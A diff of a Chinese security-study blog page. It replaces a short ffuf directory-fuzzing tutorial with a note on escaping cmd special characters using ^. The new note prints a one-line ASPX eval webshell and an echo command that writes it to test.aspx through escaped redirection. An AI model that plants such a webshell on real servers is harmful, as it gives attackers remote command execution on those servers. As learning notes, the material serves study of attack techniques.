@@ -16,23 +16,23 @@
   <meta name="author" content="Nan-911">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介FFUF：一款高效的FUZZ工具。 特性： 一个字，快！ 但是速度越快往往也越容易被ban。 安装地址：https:&#x2F;&#x2F;github.com&#x2F;ffuf&#x2F;ffuf&#x2F;releases  &#x2F;&#x2F; 可自行下载编译后的 也可以使用源代码进行编译 基本攻击目录扫描：-w 设置字典 -u 设置目标 也可以进行子域名枚举，更换字典与FUZZ位置即可，灵活运用。 这里我以Fuzz目录来做演示： 1ffuf.exe">
+    <meta name="description" content="一、前言经常写shell会有^符号，一开始不太明白这有什么作用，为什么要加^符号，于是便学习一下转义符号的使用。 转义字符^用在特殊符号之前，取消特殊字符的作用。 一般而言，^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功能，如果需要把它们作为字符输出的话，e">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ffuf">
-<meta property="og:url" content="https://nan-918.github.io/2022/04/18/ffuf/index.html">
+<meta property="og:title" content="dos中的转义字符">
+<meta property="og:url" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/index.html">
 <meta property="og:site_name" content="Nan-911">
-<meta property="og:description" content="简介FFUF：一款高效的FUZZ工具。 特性： 一个字，快！ 但是速度越快往往也越容易被ban。 安装地址：https:&#x2F;&#x2F;github.com&#x2F;ffuf&#x2F;ffuf&#x2F;releases  &#x2F;&#x2F; 可自行下载编译后的 也可以使用源代码进行编译 基本攻击目录扫描：-w 设置字典 -u 设置目标 也可以进行子域名枚举，更换字典与FUZZ位置即可，灵活运用。 这里我以Fuzz目录来做演示： 1ffuf.exe">
+<meta property="og:description" content="一、前言经常写shell会有^符号，一开始不太明白这有什么作用，为什么要加^符号，于是便学习一下转义符号的使用。 转义字符^用在特殊符号之前，取消特殊字符的作用。 一般而言，^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功能，如果需要把它们作为字符输出的话，e">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://nan-918.github.io/2022/04/18/ffuf/image-20220418171554921.png">
-<meta property="og:image" content="https://nan-918.github.io/2022/04/18/ffuf/image-20220418182952956.png">
-<meta property="article:published_time" content="2022-04-18T08:58:59.000Z">
-<meta property="article:modified_time" content="2022-04-27T16:39:24.635Z">
+<meta property="og:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog/blog/source_posts/dos中的转义字符/image-20220501010819279.png">
+<meta property="og:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog/blog/source_posts/dos中的转义字符/image-20220501010855969.png">
+<meta property="article:published_time" content="2022-04-30T16:58:00.000Z">
+<meta property="article:modified_time" content="2022-04-30T17:12:44.510Z">
 <meta property="article:author" content="Nan-911">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://nan-918.github.io/2022/04/18/ffuf/image-20220418171554921.png">
+<meta name="twitter:image" content="https://nan-918.github.io/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog/blog/source_posts/dos中的转义字符/image-20220501010819279.png">
   
   
-  <title>ffuf - Nan-911</title>
+  <title>dos中的转义字符 - Nan-911</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ffuf"></span>
+            <span id="subtitle" data-typed-text="dos中的转义字符"></span>
           
         </div>
 
@@ -212,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-04-18 16:58" pubdate>
-          2022年4月18日 下午
+        <time datetime="2022-05-01 00:58" pubdate>
+          2022年5月1日 凌晨
         </time>
       </span>
     
@@ -224,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          329 字
+          1.1k 字
         
       </span>
     
@@ -235,7 +235,7 @@
         
         
         
-          3 分钟
+          10 分钟
         
       </span>
     
@@ -281,26 +281,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ffuf</h1>
+            <h1 style="display: none">dos中的转义字符</h1>
             
             <div class="markdown-body">
               
-              <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>FFUF：一款高效的FUZZ工具。</p>
-<p><strong>特性：</strong></p>
-<p>一个字，快！</p>
-<p>但是速度越快往往也越容易被ban。</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>地址：<a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf/releases">https://github.com/ffuf/ffuf/releases</a>  // 可自行下载编译后的 也可以使用源代码进行编译</p>
-<h3 id="基本攻击"><a href="#基本攻击" class="headerlink" title="基本攻击"></a>基本攻击</h3><h4 id="目录扫描："><a href="#目录扫描：" class="headerlink" title="目录扫描："></a>目录扫描：</h4><p><code>-w </code>设置字典 <code>-u</code> 设置目标</p>
-<p>也可以进行子域名枚举，更换字典与FUZZ位置即可，灵活运用。</p>
-<p>这里我以Fuzz目录来做演示：</p>
-<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">ffuf.exe -c -w dict\php.txt -u http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span>/FUZZ<br></code></pre></td></tr></table></figure>
+              <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>经常写shell会有<code>^</code>符号，一开始不太明白这有什么作用，为什么要加<code>^</code>符号，于是便学习一下转义符号的使用。</p>
+<h1 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符^"></a>转义字符^</h1><p><strong>用在特殊符号之前，取消特殊字符的作用。</strong></p>
+<p><strong>一般而言，^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功能，如果需要把它们作为字符输出的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符^，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^^……之类的格式来处理；</strong></p>
+<p><strong>正常webshell：</strong></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt;&lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/18/ffuf/image-20220418171554921.png" srcset="/img/loading.gif" lazyload></p>
-<p>多层目录扫描：</p>
-<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">ffuf.exe -c -w dict\php.txt:FUZZ1 -w dict\dir.txt:FUZZ2 -u http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span>/FUZZ1/FUZZ2<br></code></pre></td></tr></table></figure>
+<p>如果使用cmd写入webshell，如果不进行转义的话则是：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">echo</span> <span class="hljs-operator">&lt;%@</span> <span class="hljs-variable">Page</span> <span class="hljs-built_in">Language</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Jscript&quot;</span><span class="hljs-operator">%&gt;&lt;%</span><span class="hljs-variable">eval</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Request</span><span class="hljs-operator">.</span><span class="hljs-built_in">Item</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-operator">,</span><span class="hljs-string">&quot;unsafe&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;%&gt;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Anonymous</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">aspx</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/18/ffuf/image-20220418182952956.png" srcset="/img/loading.gif" lazyload></p>
-<p>待更新………………</p>
+<p>使用上面语句写入shell会报错：</p>
+<p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog\blog\source_posts\dos中的转义字符\image-20220501010819279.png" srcset="/img/loading.gif" lazyload></p>
+<p>进行转义后则写入成功：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">echo</span> <span class="hljs-operator">^&lt;%@</span> <span class="hljs-variable">Page</span> <span class="hljs-built_in">Language</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Jscript&quot;</span><span class="hljs-operator">%^&gt;^&lt;%</span><span class="hljs-variable">eval</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Request</span><span class="hljs-operator">.</span><span class="hljs-built_in">Item</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-operator">,</span><span class="hljs-string">&quot;unsafe&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;%^&gt;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Anonymous</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">aspx</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog\blog\source_posts\dos中的转义字符\image-20220501010855969.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>&gt; 定向符</strong><br>将输出的内容重定向到指定(文本中)<br>比如<br>echo 123456789 &gt; 1.txt<br>输出字符串到1.txt中</p>
+<p><strong>&gt;&gt; 定向符(追加)</strong><br>将输出内容写入指定(文本中)<br>注意<code>&gt;</code>将覆盖文本中原有内容<code>&gt;&gt;</code> 则是在文本的最后添加内容<code>&gt;&gt;</code>追加内容时，会先换行再追加内容。</p>
+<p>比如</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">123</span> &gt; <span class="hljs-number">1</span>.txt<br><span class="hljs-attribute">echo</span> <span class="hljs-number">456</span> &gt;&gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>文本中有两行分别是123和456<br>如果<code>echo 456 &gt; 1.txt</code><br>那么原有文本中的所有内容将会被覆盖掉变成456</p>
 
               
             </div>
@@ -323,7 +328,7 @@
   
     <span>></span>
     
-  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Tools/" class="category-chain-item">Tools</a>
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -345,8 +350,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ffuf</div>
-      <div>https://nan-918.github.io/2022/04/18/ffuf/</div>
+      <div>dos中的转义字符</div>
+      <div>https://nan-918.github.io/2022/05/01/dos中的转义字符/</div>
     </div>
     <div class="license-meta">
       
@@ -358,7 +363,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年4月18日</div>
+          <div>2022年5月1日</div>
         </div>
       
       
@@ -388,18 +393,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/" title="内网学习笔记-PsExec和WMI使用">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网学习笔记-PsExec和WMI使用</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/15/%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93-2021-2022/" title="实习总结-2021-2022">
-                        <span class="hidden-mobile">实习总结-2021-2022</span>
+                      <a href="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/" title="内网学习笔记-PsExec和WMI使用">
+                        <span class="hidden-mobile">内网学习笔记-PsExec和WMI使用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
